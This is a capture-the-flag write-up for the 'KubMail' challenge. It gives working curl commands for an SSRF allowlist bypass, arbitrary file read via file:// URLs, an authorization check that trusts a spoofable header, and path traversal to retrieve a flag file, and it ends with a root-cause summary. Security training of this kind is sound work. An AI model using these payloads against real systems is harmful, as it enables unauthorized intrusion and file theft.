# KubMail (KubSTU CTF) — Solved

**Targets (identical mirrors):**
- http://159.194.241.219:5000
- http://159.194.250.157:5000
- http://45.153.189.92:5000

**Goal:** read `krd_weather_backup.txt` (the "old archive gateway" file).
**Flag:** `KubSTU{kuban_legacy_gateway_reads_between_the_lines}`

---

## TL;DR kill chain

`/api/preview` SSRF (substring allowlist bypass) → `file://` arbitrary read → recover `/app/app.py` →
discover header-gated `/internal/*` gateway routes → leaked ticket → path traversal on
`/internal/archive/export` → flag.

The chain name is hinted by the app: preview feature + "old archive gateway … still operating on the internal network".

---

## Step 1 — SSRF in `/api/preview`

`GET /api/preview?url=<URL>` fetches the URL server-side (Python `urllib`). The only guard:

```python
if 'kubmail.local' not in target:
    return jsonify({'error':'destination is not on the approved integration network'}), 403
```

It is a **substring check on the whole URL**, not on the resolved host. So keep `kubmail.local`
anywhere in the URL (e.g. a query param) and point the real host anywhere:

```bash
BASE="http://159.194.241.219:5000"
curl -s -G "$BASE/api/preview" --data-urlencode "url=http://127.0.0.1:5000/?x=kubmail.local"
```

`urllib` supports `file://` too, giving **arbitrary file read**. The query string is appended to the
filename, so use a URL fragment instead (fragment is stripped, substring check still passes):

```bash
curl -s -G "$BASE/api/preview" --data-urlencode "url=file:///etc/os-release#kubmail.local"
# -> {"body":"PRETTY_NAME=\"Debian GNU/Linux 13 (trixie)\"...","content_type":"text/plain",...}
```

## Step 2 — Read the application source

```bash
curl -s -G "$BASE/api/preview" --data-urlencode "url=file:///app/app.py#kubmail.local" \
 | python3 -c 'import sys,json;print(json.load(sys.stdin)["body"])'
```

Key findings in `/app/app.py`:
- `PUBLIC_DIR = /app/data/public`, `PRIVATE_DIR = /app/data/private`
- Three `/internal/*` routes, each gated only by `request.headers.get('X-Kubmail-Proxy') == 'preview-v2'`
- The preview proxy itself sets `X-Kubmail-Proxy: preview-v2` on every outbound request
- `/internal/archive/export` does `name = unquote(raw)` (a **second** decode after Flask's), then
  `(PUBLIC_DIR / name).resolve()` with **no containment check** → traversal

## Step 3 — Reach the internal gateway

The mirror exposes the app on `:5000` directly, so the internal routes are reachable by simply
sending the magic header (no pivot needed):

```bash
H='X-Kubmail-Proxy: preview-v2'
curl -s -H "$H" "$BASE/internal/health"
# {"service":"krd-archive-gateway","status":"ok","build":"2024.03.17",...,"note":"legacy export requires a gateway ticket"}

curl -s -H "$H" "$BASE/internal/debug/routes"
# {"export":{"method":"GET","parameter":"name","ticket":"tram-7-archive"},"routes":[...],"warning":"debug route accidentally enabled in beta"}
```

Ticket leaked: **`tram-7-archive`**.

## Step 4 — Path traversal → flag

```bash
curl -s -H "X-Kubmail-Proxy: preview-v2" \
  "$BASE/internal/archive/export?ticket=tram-7-archive&name=%2e%2e%2fprivate%2fkrd_weather_backup.txt"
# Архив метеослужбы Краснодара — внутренний файл
# KubSTU{kuban_legacy_gateway_reads_between_the_lines}
```

Resolves to `/app/data/private/krd_weather_backup.txt`.
(Single- and double-encoded `../` both work; double-encoding `%252e%252e%252f` exercises the
"second legacy decoding layer" the source comments about.)

---

## Dead ends (documented)

- `GET /download?name=` — hard-blocks `/`, `\`, `..` and only serves `data/public/`; not exploitable.
- `/api/route`, `/status`, `/api/docs` — no injection; `/api/docs` only advertises the preview endpoint.
- Direct port scan of `127.0.0.1` via SSRF: only `:5000` is listening — no separate internal service was needed.

## Root causes

1. **Broken SSRF allowlist** — substring match on the raw URL instead of validating the effective host/scheme;
   no scheme restriction (`file://` allowed).
2. **Trusting a client-supplied header** (`X-Kubmail-Proxy`) as the sole authz for `/internal/*`.
3. **Double URL-decoding + missing path containment** in the archive export route.
